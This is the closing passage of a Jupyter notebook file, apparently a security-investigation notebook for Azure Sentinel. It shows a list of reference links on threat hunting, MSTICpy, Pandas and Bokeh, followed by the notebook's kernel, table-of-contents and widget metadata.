        " - [Threat Hunting in the cloud with Azure Notebooks](https://medium.com/@maarten.goet/threat-hunting-in-the-cloud-with-azure-notebooks-supercharge-your-hunting-skills-using-jupyter-8d69218e7ca0)\n",
        " - [MSTICpy documentation](https://msticpy.readthedocs.io/)\n",
        " - [Azure Sentinel Notebooks documentation](https://docs.microsoft.com/en-us/azure/sentinel/notebooks)\n",
        " - [The Infosec Jupyterbook](https://infosecjupyterbook.com/introduction.html)\n",
        " - [Linux Host Explorer Notebook walkthrough](https://techcommunity.microsoft.com/t5/azure-sentinel/explorer-notebook-series-the-linux-host-explorer/ba-p/1138273)\n",
        " - [Why use Jupyter for Security Investigations](https://techcommunity.microsoft.com/t5/azure-sentinel/why-use-jupyter-for-security-investigations/ba-p/475729)\n",
        " - [Security Investigtions with Azure Sentinel & Notebooks](https://techcommunity.microsoft.com/t5/azure-sentinel/security-investigation-with-azure-sentinel-and-jupyter-notebooks/ba-p/432921)\n",
        " - [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/user_guide/index.html)\n",
        " - [Bokeh Documentation](https://docs.bokeh.org/en/latest/)"
      ]
    }
  ],
  "metadata": {
    "celltoolbar": "Edit Metadata",
    "hide_input": false,
    "kernelspec": {
      "display_name": "Python 3.6",
      "language": "python",
      "name": "python36"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.6"
    },
    "toc": {
      "base_numbering": 1,
      "nav_menu": {},
      "number_sections": true,
      "sideBar": true,
      "skip_h1_title": false,
      "title_cell": "Table of Contents",
      "title_sidebar": "Contents",
      "toc_cell": false,
      "toc_position": {},
      "toc_section_display": true,
      "toc_window_display": false
    },
    "varInspector": {
      "cols": {
        "lenName": 16,
        "lenType": 16,
        "lenVar": 40
      },
      "kernels_config": {
        "python": {
          "delete_cmd_postfix": "",
          "delete_cmd_prefix": "del ",
          "library": "var_list.py",
          "varRefreshCmd": "print(var_dic_list())"
        },
        "r": {
          "delete_cmd_postfix": ") ",
          "delete_cmd_prefix": "rm(",
          "library": "var_list.r",
          "varRefreshCmd": "cat(var_dic_list()) "
        }
      },
      "types_to_exclude": [
        "module",
        "function",
        "builtin_function_or_method",
        "instance",
        "_Feature"
      ],
      "window_display": false
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "state": {},
        "version_major": 2,
        "version_minor": 0
      }
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
